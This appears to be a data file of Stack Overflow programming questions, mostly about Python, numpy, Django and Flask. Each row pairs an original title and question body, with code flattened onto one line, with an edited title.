Dicrete Fourier Transform: How to use fftshift correctly with fft," I want numerically compute the FFT on a numpy array Y. For testing, I'm using the Gaussian function Y = exp(-x^2). The (symbolic) Fourier Transform is Y' = constant * exp(-k^2/4). The naive approach fails: real(Y_k) jumps between positive and negative values, which correspond to a jumping phase, which is not present in the symbolic result. This is certainly not desirable. (The result is technically correct in the sense that abs(Y_k) gives the amplitudes as expected ifft(Y_k) is Y.)Here, the function fftshift() renders the array k monotonically increasing and changes Y_k accordingly. The pairs zip(k, Y_k) are not changed by applying this operation to both vectors.This changes appears to fix the issue: Is this the correct way to employ the fft() function if monotonic Y and Y_k are required?The reverse operation of the above is: For this case, the documentation clearly states that Y_k must be sorted compatible with the output of fft() and fftfreq(), which we can achieve by applying ifftshift().Those questions have been bothering me for a long time: Are the output and input arrays of both fft() and ifft() always such that a[0] should contain the zero frequency term, a[1:n/2+1] should contain the positive-frequency terms, and a[n/2+1:] should contain the negative-frequency terms, in order of decreasingly negative frequency [numpy reference], where 'frequency' is the independent variable?The answer on Fourier Transform of a Gaussian is not a Gaussian does not answer my question. <code>  import numpyX = numpy.arange(-100,100)Y = numpy.exp(-(X/5.0)**2) from numpy.fft import *from matplotlib import pyplotdef plotReIm(x,y): f = pyplot.figure() ax = f.add_subplot(111) ax.plot(x, numpy.real(y), 'b', label='R()') ax.plot(x, numpy.imag(y), 'r:', label='I()') ax.plot(x, numpy.abs(y), 'k--', label='abs()') ax.legend()Y_k = fftshift(fft(Y))k = fftshift(fftfreq(len(Y)))plotReIm(k,Y_k) Y_k = fftshift(fft(ifftshift(Y)))k = fftshift(fftfreq(len(Y)))plotReIm(k,Y_k) Yx = fftshift(ifft(ifftshift(Y_k)))x = fftshift(fftfreq(len(Y_k), k[1] - k[0]))plotReIm(x,Yx) ",Discrete Fourier Transform: How to use fftshift correctly with fft
Formating Complex Numbers in Python," For a project in one of my classes we have to output numbers up to five decimal places.It is possible that the output will be a complex number and I am unable to figure out how to output a complex number with five decimal places. For floats I know it is just:print ""%0.5f""%variable_nameIs there something similar for complex numbers? <code> ",Formatting Complex Numbers
Formating Complex Numbers," For a project in one of my classes we have to output numbers up to five decimal places.It is possible that the output will be a complex number and I am unable to figure out how to output a complex number with five decimal places. For floats I know it is just:print ""%0.5f""%variable_nameIs there something similar for complex numbers? <code> ",Formatting Complex Numbers
How to unzip a zip file with Python 2.4?, I'm having a hard time figuring out how to unzip a zip file with 2.4. extract() is not included in 2.4. I'm restricted to using 2.4.4 on my server.Can someone please provide a simple code example? <code> ,How to unzip a file with Python 2.4?
what happens if two python scripts want to write in the same file?, I have a pipeline which at some point splits work into various sub-processes that do the same thing in parallel. Thus their output should go into the same file.Is it too risky to say all of those processes should write into the same file? Or does python try and retry if it sees that this resource is occupied? <code> ,What happens if two python scripts want to write in the same file?
How to convert rec array to array?," What's the best way to convert numpy's recarray to a normal array?i could do a .tolist() first and then do an array() again, but that seems somewhat inefficient..Example: <code>  import numpy as npa = np.recarray((2,), dtype=[('x', int), ('y', float), ('z', int)])>>> a rec.array([(30408891, 9.2944097561804909e-296, 30261980), (44512448, 4.5273310988985789e-300, 29979040)], dtype=[('x', '<i4'), ('y', '<f8'), ('z', '<i4')])>>> np.array(a.tolist()) array([[ 3.04088910e+007, 9.29440976e-296, 3.02619800e+007], [ 4.45124480e+007, 4.52733110e-300, 2.99790400e+007]])",How to convert numpy.recarray to numpy.array?
Is this a pythonic method of executing functions based on the values of a tuple?," I have a situation where I have six possible situations which can relate to four different results. Instead of using an extended if/else statement, I was wondering if it would be more pythonic to use a dictionary to call the functions that I would call inside the if/else as a replacement for a ""switch"" statement, like one might use in C# or php.My switch statement depends on two values which I'm using to build a tuple, which I'll in turn use as the key to the dictionary that will function as my ""switch"". I will be getting the values for the tuple from two other functions (database calls), which is why I have the example one() and zero() functions.This is the code pattern I'm thinking of using which I stumbled on with playing around in the python shell: I don't have the actual code written or I would post it here, as I would like to know if this method is considered a python best practice. I'm still a python learner in university, and if this is a method that's a bad habit, then I would like to kick it now before I get out into the real world.Note, the result of executing the code above is as expected, simply ""RUN"" and ""WALK"".editFor those of you who are interested, this is how the relevant code turned out. It's being used on a google app engine application. You should find the code is considerably tidier than my rough example pattern. It works much better than my prior convoluted if/else tree. <code>  def one(): #Simulated database value return 1def zero(): return 0def run(): #Shows the correct function ran print ""RUN"" return 1def walk(): print ""WALK"" return 1def main(): switch_dictionary = {} #These are the values that I will want to use to decide #which functions to use switch_dictionary[(0,0)] = run switch_dictionary[(1,1)] = walk #These are the tuples that I will build from the database zero_tuple = (zero(), zero()) one_tuple = (one(), one()) #These actually run the functions. In practice I will simply #have the one tuple which is dependent on the database information #to run the function that I defined before switch_dictionary[zero_tuple]() switch_dictionary[one_tuple]() def GetAssignedAgent(self): tPaypal = PaypalOrder() #Parent class for this function tAgents = [] Switch = {} #These are the different methods for the actions to take Switch[(0,0)] = tPaypal.AssignNoAgent Switch[(0,1)] = tPaypal.UseBackupAgents Switch[(0,2)] = tPaypal.UseBackupAgents Switch[(1,0)] = tPaypal.UseFullAgents Switch[(1,1)] = tPaypal.UseFullAndBackupAgents Switch[(1,2)] = tPaypal.UseFullAndBackupAgents Switch[(2,0)] = tPaypal.UseFullAgents Switch[(2,1)] = tPaypal.UseFullAgents Switch[(2,2)] = tPaypal.UseFullAgents #I'm only interested in the number up to 2, which is why #I can consider the Switch dictionary to be all options available. #The ""state"" is the current status of the customer agent system tCurrentState = (tPaypal.GetNumberofAvailableAgents(), tPaypal.GetNumberofBackupAgents()) tAgents = Switch[tCurrentState]()","Is this a ""pythonic"" method of executing functions as a python switch statement for tuple values?"
no need for enums," I read a post recently where someone mentioned that there is no need for using enums in python. I'm interested in whether this is true or not.For example, I use an enum to represent modem control signals: Isn't it better that I use if signal == Signals.CTS: than if signal == ""CTS"":, or am I missing something? <code>  class Signals: CTS = ""CTS"" DSR = ""DSR"" ...",No need for enums
Python libraries for integrating Django," I decide to write some applications using facebook and django (or even twisted, but it doesn't matter), and now I can't choose appropriate tools. I see there are many API-wrappers writed on Python exists for Facebook: official, but seems no longer supported Python-SDKnew and actively developed, but seems too new Django-facebookgood old, but not maintained pyfacebooksimple, well-maintaned, but non-documented fandjangosome other very primitive toolsI saw some similar questions here, but I'm noticed that Facebook is periodically introduces big changes into their API and those advices may be already outdated, or may be new libraries appeared.Also I'd like to know about most significant differences between those libraries. And of course good documentation and tutorials are welcome. <code> ",Python libraries for integrating Django with Facebook
Python best practice and securest to connect to MySQL and execute queries," What is the safest way to run queries on MySQL? I am aware of the dangers involved with MySQL and SQL injection.However, I do not know how I should run my queries to prevent injection on the variables to which other users (webclients) can manipulate. I used to write my own escape function, but apparently this is ""not-done"".What should I use and how should I use it to query and do inserts safely on a MySQL database through python without risking MySQL injection? <code> ",Python: best practice and securest way to connect to MySQL and execute queries
Is adding attributes dynamically not frowned upon in Python?," In Python, you can assign an arbitrary attribute from outside the defining class: The underlying mechanism here is __dict__ attribute that maintains a dictionary of all attributes.We were all told not to expose our inner workings to the client code, but attaching new data doesn't have to do with encapsulation at all, right? Is this idiom common for Python code?Just What I MeanEach Tweet has standard fields, like id, text, owner.When returning tweet list for a user, you want to display if a tweet is favorited by this user.Obviously, to obtain is_favorite you need to query many-to-many relationship for this user.Would it be OK to pre-fill Tweet objects with is_favorite corresponding to current user?Sure I could expose a method is_favorite_for(user) but I'm hitting Django template language limitations that doesn't allow to call methods with arguments from inside the template. Also, I believe a template should not be calling methods at all.I know this will work fine, but I wonder if doing something like that in an open source project would get other developers to look on me with contempt. Sidenote: I come from C#/.NET background where dynamic types were introduced very recently and aren't adapted widely except for some niche areas (interoperability, IoC frameworks, REST client frameworks, etc). <code>  class Profile(models.Model): user = models.OneToOneField(User) name = models.CharField(max_length=140)p = Profile()p.age = 42",Is adding attributes dynamically frowned upon in Python?
How to get value from selected item in treeview? PyGTK," I'm learning PyGtk. I have a simple treeview with 1 column, I get items for that treeview from list. How to get value of selected item in treeview? <code> ",How to get value from selected item in treeview in PyGTK?
export PYTHONPATH for all users (including root) on GNU/Linux using Bash," EDIT: Works for root, sudo is the problem. Read below.I have a directory with my own libraries, e.g. my Python libraries are located at /home/name/lib/py.I've added this directory to Python's PATH for all users (including root) by adding the following line to /etc/bash.bashrc: It works for all users (including root). But it doesn't work for sudo. Is there any way I can make sudo use /etc/bash.bashrc?EDIT: More information:I've added PYTHONPATH to sudoers file like so: Defaults env_keep += ""HOME PYTHONPATH"". It sitll doesn't work. <code>  export PYTHONPATH=$PYTHONPATH:/home/name/lib/py env | grep PYTHON: PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=/home/name/lib/pysudo env | grep PYTHON: PYTHONDONTWRITEBYTECODE=1sudo echo $PYTHONPATH: /home/name/lib/py",PYTHONPATH not working for sudo on GNU/Linux (works for root)
Python check for valid email address?, Is there a good way to check a form input using regex to make sure it is a proper style email address? Been searching since last night and everybody that has answered peoples questions regarding this topic also seems to have problems with it if it is a subdomained email address. <code> ,How to check for valid email address?
Can I define closures anywhere in Python?," Sometimes I find that I have to use functions with long names such as os.path.abspath and os.path.dirname a lot in just a few lines of code. I don't think it's worth littering the global namespace with such functions, but it would be incredibly helpful to be able to define a scope around the lines where I need those functions. As an example, this would be perfect: I'd love to know if this is doable somehow <code>  import os, sysclosure: abspath = os.path.abspath dirname = os.path.dirname # 15 lines of heavy usage of those functions# Can't access abspath or dirname here",Can I define a scope anywhere in Python?
Split string on commas but ignore commas within double-quotes (Python)?," I have some input that looks like the following: The comma-separated values can be in any order. I'd like to split the string on commas; however, in the case where something is inside double quotation marks, I need it to both ignore commas and strip out the quotation marks (if possible). So basically, the output would be this list of strings: I've had a look at some other answers, and I'm thinking a regular expression would be best, but I'm terrible at coming up with them. <code>  A,B,C,""D12121"",E,F,G,H,""I9,I8"",J,K ['A', 'B', 'C', 'D12121', 'E', 'F', 'G', 'H', 'I9,I8', 'J', 'K']",Split string on commas but ignore commas within double-quotes?
convert list of tuples to multiple lists in Python," Suppose I have a list of tuples and I want to convert to multiple lists.For example, the list of tuples is Is there any built-in function in Python that convert it to: This can be a simple program. But I am just curious about the existence of such built-in function in Python. <code>  [(1,2),(3,4),(5,6),] [1,3,5],[2,4,6]",How to convert list of tuples to multiple lists?
How do I convert a single character into it's hex ascii value in python, I am interested in taking in a single character. output: What is the simplest way of going about this? Any predefined string library stuff? <code>  c = 'c' # for examplehex_val_string = char_to_hex_string(c)print hex_val_string 63,How do I convert a single character into its hex ASCII value in Python?
404 on requests without tailing slash to i18n urls," Because of the APPEND_SLASH = True setting all requests with ""/whatever/path"" will be redirected to ""/whatever/path/"".BUT urls definded within a i18n_patterns() don't redirect for some reasoneven the test works: <code>  ./runtests.py --settings=test_sqlite i18n.URLRedirectWithoutTrailingSlashTests",404 on requests without trailing slash to i18n urls
set matplotlib 3d plot aspect ratio?," Setting the aspect ratio works for 2d plots: But does not for 3d: Is there a different syntax for the 3d case, or it's not implemented? <code>  import matplotlib.pyplot as pltfrom mpl_toolkits.mplot3d import Axes3D ax = plt.axes()ax.plot([0,1],[0,10])ax.set_aspect('equal','box') ax = plt.axes(projection='3d')ax.plot([0,1],[0,1],[0,10])ax.set_aspect('equal','box')",set matplotlib 3d plot aspect ratio
Why is only one flask.app.teardown_request function being called when view raises Exception?," This simple application, has two teardown_request handlers, and I'd expect both of them to be called for every request, no matter what happens in the view implementation, as per the documentation However, when I run it and make requests to the three views in turn, I get the following output: Only one of the teardown_request functions is being called when an exception that is not derived from werkzeug.exceptions.HTTPException is raised by the last view. Any ideas why, or is this a bug in flask? <code>  import flaskimport werkzeug.exceptionsapp = flask.Flask(__name__)@app.teardown_requestdef teardown1(response): print ""Teardown 1"" return response@app.teardown_requestdef teardown2(response): print ""Teardown 2"" return response@app.route(""/"")def index(): return ""chunky bacon""@app.route(""/httpexception"")def httpexception(): raise werkzeug.exceptions.BadRequest(""no bacon?"")@app.route(""/exception"")def exception(): raise Exception(""bacoff"")if __name__ == ""__main__"": app.run(port=5000) Teardown 2Teardown 1127.0.0.1 - - [15/Nov/2011 18:53:16] ""GET / HTTP/1.1"" 200 -Teardown 2Teardown 1127.0.0.1 - - [15/Nov/2011 18:53:27] ""GET /httpexception HTTP/1.1"" 400 -Teardown 2127.0.0.1 - - [15/Nov/2011 18:53:33] ""GET /exception HTTP/1.1"" 500 -",Why is only one Flask teardown_request function being called when view raises Exception?
site packages python," So I have two sitepackage folders:Under: /Library/Python/2.6/site-packagesUnder: /Library/Python/2.6/site-packages /Library/Frameworks/Python.framework/Versions/2.6/lib/python2.6/site-packagesEvery time I do sudo easy_install module, Python installs it in (1).Every time I try to import it from (1), Python can't find it.Every time I move that module with copy and paste to (2), Python can find it.Is there an elegant/regular way to make Python install it in the correct sitepackages? <code> ",Site packages in Python
How to create a ssh tunnel using python and paramiko?," I need to create tunneling to read information from a database. I use Paramiko, but I have not worked with tunneling yet. Please provide an example of a simple code that creates and closes a tunnel. <code> ",How to create a SSH tunnel using Python and Paramiko?
Rewriting an existing system in Django," I have used Django before (version 1.2) and generally I like it... it is especially good at getting a brand new project up and running quickly. But, in this case, I'm rewriting and existing system and moving it to Python/Django. So, I already have a MySQL database that has a ""users"" table in it... this table stores the user's password with the MySQL SHA1 function (no salt, etc).As part of the migration, I'm going to fix some of the data modeling flaws and port to PostgreSQL. I would really like to use django.contrib.auth, but I'm unclear what I need to do. I have read the documentation, and know that I can separate the required user information and the ""extra"" information I have and put it into UserProfile. But, how to handle the passwords stored in the MySQL db?Has anyone handled this before? What approach did you take?  <code> ",Migrating a password field to Django
"django appending ""_id"" to a foreign key field"," In django, if I set a field in a model to a foreign key, ""_id"" is appended to the name of that field. How can this be prevented? <code> ","Preventing django from appending ""_id"" to a foreign key field"
What for is the `if name=__main__` in python?," Possible Duplicate: What does <if name==“main”:> do? I have wrote scripts in Python for quite a while now and I study more of Python as I need it. When reading other people's code I meet if name == ""__main__"": construct quite often. What is it good for? <code> ","What does `if name == ""__main__""` mean in Python?"
Python sets are not json serializable," I have a Python set that contains objects with __hash__ and __eq__ methods in order to make certain no duplicates are included in the collection.I need to json encode this result set, but passing even an empty set to the json.dumps method raises a TypeError. I know I can create an extension to the json.JSONEncoder class that has a custom default method, but I'm not even sure where to begin in converting over the set. Should I create a dictionary out of the set values within the default method, and then return the encoding on that? Ideally, I'd like to make the default method able to handle all the datatypes that the original encoder chokes on (I'm using Mongo as a data source so dates seem to raise this error too)Any hint in the right direction would be appreciated.EDIT:Thanks for the answer! Perhaps I should have been more precise.I utilized (and upvoted) the answers here to get around the limitations of the set being translated, but there are internal keys that are an issue as well.The objects in the set are complex objects that translate to __dict__, but they themselves can also contain values for their properties that could be ineligible for the basic types in the json encoder.There's a lot of different types coming into this set, and the hash basically calculates a unique id for the entity, but in the true spirit of NoSQL there's no telling exactly what the child object contains.One object might contain a date value for starts, whereas another may have some other schema that includes no keys containing ""non-primitive"" objects.That is why the only solution I could think of was to extend the JSONEncoder to replace the default method to turn on different cases - but I'm not sure how to go about this and the documentation is ambiguous. In nested objects, does the value returned from default go by key, or is it just a generic include/discard that looks at the whole object? How does that method accommodate nested values? I've looked through previous questions and can't seem to find the best approach to case-specific encoding (which unfortunately seems like what I'm going to need to do here). <code>  File ""/usr/lib/python2.7/json/encoder.py"", line 201, in encode chunks = self.iterencode(o, _one_shot=True) File ""/usr/lib/python2.7/json/encoder.py"", line 264, in iterencode return _iterencode(o, 0) File ""/usr/lib/python2.7/json/encoder.py"", line 178, in default raise TypeError(repr(o) + "" is not JSON serializable"")TypeError: set([]) is not JSON serializable",How to JSON serialize sets?
python 2 and python 3 __cmp__," The following piece of code works fine in Python 2, but in Python 3 I get an error: It only works for == and !=. <code>  class point: def __init__(self, x, y): self.x = x self.y = y def dispc(self): return ('(' + str(self.x) + ',' + str(self.y) + ')') def __cmp__(self, other): return ((self.x > other.x) and (self.y > other.y)) >>> p=point(2,3)>>> q=point(3,4)>>> p>qTraceback (most recent call last): File ""<stdin>"", line 1, in <module>TypeError: unorderable types: point() > point()",Why can't I use the method __cmp__ in Python 3 as for Python 2?
list of strings. python," If I have a list of strings such as: What should I do in order to get rid of all the 8s in each string? I tried using strip or replace in a for loop but it doesn't work like it would in a normal string (that not in a list). Does anyone have a suggestion? <code>  [(""aaaa8""),(""bb8""),(""ccc8""),(""dddddd8"")...]",Removing character in list of strings
PyCharm (1.5.4) and Panadas 0.6.0 - ImportError: No module named data," I am using PyCharm (1.5.4) as my python IDE on MacOS 10.6.4. I am tinkering with some code to manipulate stock price data. As part of that I want to import price data from yahoo by using the DataReader function that comes with Pandas 0.6.0. The code is as follow:http://www.statalgo.com/2011/09/08/pandas-getting-financial-data-from-yahoo-fred-etc/ When I run the code I get the following error: I see that PyCharm does not know how to unresolve the reference 'data'. My python paths are set as follows: What is puzzling is that PyCharm can resolve pandas.stats.moments but can't resolve pandas.io.data. I checked that both directories have the __init__.py file (the files are blank).At this point I am not sure how to move forward. Greatly appreciate the help.UPDATE: <code>  from pandas import ols, DataFramefrom pandas.stats.moments import rolling_stdfrom pandas.io.data import DataReaderimport datetimesp500 = DataReader(""^GSPC"", ""yahoo"", start=datetime.datetime(1990, 1, 1))sp500_returns = sp500[""adj clos""].shift(-250)/sp500[""adj clos""] - 1gdp = DataReader(""GDP"", ""fred"", start=datetime.datetime(1990, 1, 1))[""value""]gdp_returns = (gdp/gdp.shift(1) - 1)gdp_std = rolling_std(gdp_returns, 10)gdp_standard = gdp_returns / gdp_stdgdp_on_sp = ols(y=sp500_returns, x=DataFrame({""gdp"": gdp_standard}))sp500.plot()gdp.plot() Traceback (most recent call last): File ""/Users/MyName/PycharmProjects/test/mytest"", line 3, in <module> from pandas.io.data import DataReaderImportError: No module named data import sysfrom pprint import pprint as pppp(sys.path)['/private/var/folders/st/stQUFIfOG28bmpY9dCspTk+++TI/-Tmp-', '/Library/Frameworks/EPD64.framework/Versions/7.1/lib/python2.7/site-packages/scikits.statsmodels-0.3.1-py2.7.egg', '/Library/Frameworks/EPD64.framework/Versions/7.1/lib/python27.zip', '/Library/Frameworks/EPD64.framework/Versions/7.1/lib/python2.7', '/Library/Frameworks/EPD64.framework/Versions/7.1/lib/python2.7/plat-darwin', '/Library/Frameworks/EPD64.framework/Versions/7.1/lib/python2.7/plat-mac', '/Library/Frameworks/EPD64.framework/Versions/7.1/lib/python2.7/plat-mac/lib-scriptpackages', '/Library/Frameworks/EPD64.framework/Versions/7.1/lib/python2.7/lib-tk', '/Library/Frameworks/EPD64.framework/Versions/7.1/lib/python2.7/lib-old', '/Library/Frameworks/EPD64.framework/Versions/7.1/lib/python2.7/lib-dynload', '/Library/Frameworks/EPD64.framework/Versions/7.1/lib/python2.7/site-packages', '/Library/Frameworks/EPD64.framework/Versions/7.1/lib/python2.7/site-packages/PIL'] $ cat __egginst__.txt # egginst metadataegg_name = 'pandas-0.3.0-3.egg'prefix = '/Library/Frameworks/EPD64.framework/Versions/7.1'installed_size = 1454562rel_files = ['EGG-INFO/pandas/__egginst__.txt','lib/python2.7/site-packages/pandas-0.3.0-3.egg-info',",PyCharm (1.5.4) and Pandas 0.6.0 - ImportError: No module named data
Get first N key pairs from an Ordered Dictionary to another one in python," I have an ordered dictionary (OrderedDict) sorted by value. How can I get the top (say 25) key values and add them to a new dictionary?For example: I have something like this: Now ordered is an ordered dictionary, I want to create a dictionary, say by taking the top 2 most-frequent items and their keys: <code>  dictionary={'a':10,'b':20,'c':30,'d':5}ordered=OrderedDict(sorted(dictionary.items(), key=lambda x: x[1],reverse=True)) frequent={'c':30,'b':20}",Get first N key pairs from an Ordered Dictionary to another one
Insert LIST on my database using PYTHON," I want to insert a list in my database but I can't.Here is an example of what I need: Can something like this be done? Can I insert a list as a value?When I try it, an error says that is because of an error in MySQL syntax <code>  variable_1 = ""HELLO""variable_2 = ""ADIOS""list = [variable_1,variable_2]INSERT INTO table VALUES ('%s') % list",Insert list into my database using Python
Whats the difference between Python decorators and Decorator Pattern?," What is the difference between Python decorators and the decorator pattern?When should I use Python decorators, and when should I use the decorator pattern?I'm looking for examples of Python decorators and the decorator pattern accomplishing same.@AcceptedAnswerI know that Jakob Bowyer's answer is valid. Yet it's Srikar's answer that made me understand why.After Srikar's answer, and studying the given resources, I've written this example, so I can visualize and understand Python decorators and the decorator pattern.I must disagree with Srikar's ""Python decorators are not an implementation of the decorator pattern"". After what I've learned, I'm strongly convinced that Python decorators are an implementation of the decorator pattern. Just not in the classic way.Also, I need to add that, despite the fact that Srikar said ""Python decorators add functionality to functions and methods at definition time"", you can easily use Python decorators at run time.Yet, I still mark Srikar's answer as accepted, because it helped me understand the implementation of the decorator pattern in Python. <code>  """"""Testing Python decorators against the decorator pattern""""""def function(string): return stringdef decorator(wrapped): def wrap(string): # Assume that this is something useful return wrapped(string.upper()) return wrapdef method_decorator(wrapped): def wrap(instance, string): # Assume that this is something useful return wrapped(instance, string.upper()) return wrap@decoratordef decorated_function(string): print('! '.join(string.split(' ')))class Class(object): def __init__(self): pass def something_useful(self, string): return stringclass Decorator(object): def __init__(self, wrapped): self.wrapped = wrapped def something_useful(self, string): string = '! '.join(string.split(' ')) return self.wrapped().something_useful(string) @method_decorator def decorated_and_useful(self,string): return self.something_useful(string)if __name__ == '__main__': string = 'Lorem ipsum dolor sit amet.' print(function(string)) # Plain function print(decorator(function)(string)) # Python decorator at run time print(decorated_function(string)) # Python decorator at definition time a = Class() print(a.something_useful(string)) # Plain method b = Decorator(Class) print(b.something_useful(string)) # Decorator pattern print(b.decorated_and_useful(string)) # Python decorator decorated the decorator pattern",What is the difference between Python decorators and the decorator pattern?
Dictionnary access speed comparison with integer key against string key," I've got a large dictionary from which I have to look up for values a lot of times. My keys are integers but represent labels so do not need to be added, subtracted, etc... I ended up trying to assess access time between string key and integer key dictionary and here is the result. which produces slight variations between runs reproduced each time : Does it prove that using dictionary with strings as keys is faster to access than with integers as keys? <code>  from timeit import TimerDint = dict()Dstr = dict()for i in range(10000): Dint[i] = i Dstr[str(i)] = iprint 'string key in Dint',print(Timer(""'7498' in Dint"", ""from __main__ import Dint"").timeit(100000000))print 'int key in Dint',print(Timer(""7498 in Dint"", ""from __main__ import Dint"").timeit(100000000))print 'string key in Dstr',print(Timer(""'7498' in Dstr"", ""from __main__ import Dstr"").timeit(100000000))print 'int key in Dstr',print(Timer(""7498 in Dstr"", ""from __main__ import Dstr"").timeit(100000000)) string key in Dint 4.5552944017int key in Dint 7.14334390267string key in Dstr 6.69923791116int key in Dstr 5.03503126455",Dictionary access speed comparison with integer key against string key
what is the best way to filter a dictionary in python," I have a dictionary of string keys and float values. I want to filter the dictionary to only include pairs that have a value greater than zero.In C#, I would do something like this: What is the equivalent code in Python? <code>  mydict = {} mydict[""joe""] = 20 mydict[""bill""] = 20.232 mydict[""tom""] = 0.0 dict = dict.Where(r=>r.Value > 0);",The best way to filter a dictionary in Python
Iterparse HTML with lxml ignoring XML syntax errors," I'm currently trying to iteratively parse a very large HTML document (I know.. yuck) to reduce the amount of memory used. The problem I'm having is that I'm getting XML syntax errors such as:lxml.etree.XMLSyntaxError: Attribute name redefined, line 134, column 59This then causes everything to stop.Is there a way to iteratively parse HTML without choking on syntax errors?At the moment I'm extracting the line number from the XML syntax error exception, removing that line from the document, and then restarting the process. Seems like a pretty disgusting solution. Is there a better way?Edit:This is what I'm currently doing: <code>  context = etree.iterparse(tfile, events=('start', 'end'), html=True)in_table = Falseheader_row = Truewhile context: try: event, el = context.next() # do something # remove old elements while el.getprevious() is not None: del el.getparent()[0] except etree.XMLSyntaxError, e: print e.msg lineno = int(re.search(r'line (\d+),', e.msg).group(1)) remove_line(tfilename, lineno) tfile = open(tfilename) context = etree.iterparse(tfile, events=('start', 'end'), html=True) except KeyError: print 'oops keyerror'",Iteratively parsing HTML (with lxml?)
Iteratively parsing HTML (with lxml)," I'm currently trying to iteratively parse a very large HTML document (I know.. yuck) to reduce the amount of memory used. The problem I'm having is that I'm getting XML syntax errors such as:lxml.etree.XMLSyntaxError: Attribute name redefined, line 134, column 59This then causes everything to stop.Is there a way to iteratively parse HTML without choking on syntax errors?At the moment I'm extracting the line number from the XML syntax error exception, removing that line from the document, and then restarting the process. Seems like a pretty disgusting solution. Is there a better way?Edit:This is what I'm currently doing: <code>  context = etree.iterparse(tfile, events=('start', 'end'), html=True)in_table = Falseheader_row = Truewhile context: try: event, el = context.next() # do something # remove old elements while el.getprevious() is not None: del el.getparent()[0] except etree.XMLSyntaxError, e: print e.msg lineno = int(re.search(r'line (\d+),', e.msg).group(1)) remove_line(tfilename, lineno) tfile = open(tfilename) context = etree.iterparse(tfile, events=('start', 'end'), html=True) except KeyError: print 'oops keyerror'",Iteratively parsing HTML (with lxml?)
Python - Convert a list of string sentences to words," I'm trying to essentially take a list of strings containg sentences such as: and convert it into the following: I tried using this: I thought it would take each string and append each item of that string to word_list, however the output is something along the lines of: I know I am making a stupid mistake but I can't figure out why, can anyone help? <code>  sentence = ['Here is an example of what I am working with', 'But I need to change the format', 'to something more useable'] word_list = ['Here', 'is', 'an', 'example', 'of', 'what', 'I', 'am','working', 'with', 'But', 'I', 'need', 'to', 'change', 'the format','to', 'something', 'more', 'useable'] for item in sentence: for word in item: word_list.append(word) word_list = ['H', 'e', 'r', 'e', ' ', 'i', 's' .....etc]",Convert a list of string sentences to words
find element in a list given a predicate in python," I want an idiomatic way to find the first element in a list that matches a predicate.The current code is quite ugly: I've thought about changing it to: But there must be something more elegant... And it would be nice if it returns a None value rather than raise an exception if no match is found.I know I could just define a function like: But it is quite tasteless to start filling the code with utility functions like this (and people will probably not notice that they are already there, so they tend to be repeated over time) if there are built ins that already provide the same. <code>  [x for x in seq if predicate(x)][0] from itertools import dropwhiledropwhile(lambda x: not predicate(x), seq).next() def get_first(predicate, seq): for i in seq: if predicate(i): return i return None",Find first element in a sequence that matches a predicate
Python: find first element in a sequence that matches a predicate," I want an idiomatic way to find the first element in a list that matches a predicate.The current code is quite ugly: I've thought about changing it to: But there must be something more elegant... And it would be nice if it returns a None value rather than raise an exception if no match is found.I know I could just define a function like: But it is quite tasteless to start filling the code with utility functions like this (and people will probably not notice that they are already there, so they tend to be repeated over time) if there are built ins that already provide the same. <code>  [x for x in seq if predicate(x)][0] from itertools import dropwhiledropwhile(lambda x: not predicate(x), seq).next() def get_first(predicate, seq): for i in seq: if predicate(i): return i return None",Find first element in a sequence that matches a predicate
find first element in a sequence that matches a predicate," I want an idiomatic way to find the first element in a list that matches a predicate.The current code is quite ugly: I've thought about changing it to: But there must be something more elegant... And it would be nice if it returns a None value rather than raise an exception if no match is found.I know I could just define a function like: But it is quite tasteless to start filling the code with utility functions like this (and people will probably not notice that they are already there, so they tend to be repeated over time) if there are built ins that already provide the same. <code>  [x for x in seq if predicate(x)][0] from itertools import dropwhiledropwhile(lambda x: not predicate(x), seq).next() def get_first(predicate, seq): for i in seq: if predicate(i): return i return None",Find first element in a sequence that matches a predicate
SqlAlchemy - Filtering by Relashionship Attribute," I don't have much experience with SQLAlchemy and I have a problem, which I can't solve. I tried searching and I tried a lot of code.This is my Class (reduced to the most significant code): and I would like to query all patients, whose mother's phenoscore is (for example) == 10As told, I tried a lot of code, but I don't get it. The logically solution, in my eyes, would be because, you can access .mother.phenoscore for each element when outputting but, this code doesn't do it.Is there a (direct) possibility to filter by an attribute of a relationship (without writing the SQL Statement, or an extra join-statement), I need this kind of filter more than one time.Even if there is no easy solution, I am happy to get all answers. <code>  class Patient(Base): __tablename__ = 'patients' id = Column(Integer, primary_key=True, nullable=False) mother_id = Column(Integer, ForeignKey('patients.id'), index=True) mother = relationship('Patient', primaryjoin='Patient.id==Patient.mother_id', remote_side='Patient.id', uselist=False) phenoscore = Column(Float) patients = Patient.query.filter(Patient.mother.phenoscore == 10)",SqlAlchemy - Filtering by Relationship Attribute
get the string within brackets in python using regex," I have a sample string <alpha.Customer[cus_Y4o9qMEZAugtnW] active_card=<alpha.AlphaObject[card] ...>, created=1324336085, description='Customer for My Test App', livemode=False>I only want the value cus_Y4o9qMEZAugtnW and NOT card (which is inside another [])How could I do it in easiest possible way in Python?Maybe by using RegEx (which I am not good at)? <code> ",Get the string within brackets in Python
Python: How to create objects on the fly?," How do I create objects on the fly in Python? I often want to pass information to my Django templates which is formatted like this: which makes the template look untidy. so I think it's better to just create an object which is like: so I can do: instead of calling the dictionary.Since I just need that object once, is it possible to create it without writing a class first? Is there any short-hand code? Is it ok to do it like that or is it bad Python? <code>  {'test': [a1, a2, b2], 'test2': 'something else', 'test3': 1} class testclass(): self.test = [a1,a2,b2] self.test2 = 'someting else' self.test3 = 1testobj = testclass() {{ testobj.test }}{{ testobj.test2 }}{{ testobj.test3 }}",How to create objects on the fly in python?
How to create objects on the fly?," How do I create objects on the fly in Python? I often want to pass information to my Django templates which is formatted like this: which makes the template look untidy. so I think it's better to just create an object which is like: so I can do: instead of calling the dictionary.Since I just need that object once, is it possible to create it without writing a class first? Is there any short-hand code? Is it ok to do it like that or is it bad Python? <code>  {'test': [a1, a2, b2], 'test2': 'something else', 'test3': 1} class testclass(): self.test = [a1,a2,b2] self.test2 = 'someting else' self.test3 = 1testobj = testclass() {{ testobj.test }}{{ testobj.test2 }}{{ testobj.test3 }}",How to create objects on the fly in python?
creating a tmp file in python," I have this function that references the path of a file: where FILE_PATH is a string of the path of a file, i.e. H:/path/FILE_NAME.extI want to create a file FILE_NAME.ext inside my python script with the content of a string: How to go about this? The Python script will be placed inside a Linux box. <code>  some_obj.file_name(FILE_PATH) some_string = 'this is some content'",How can I create a tmp file in Python?
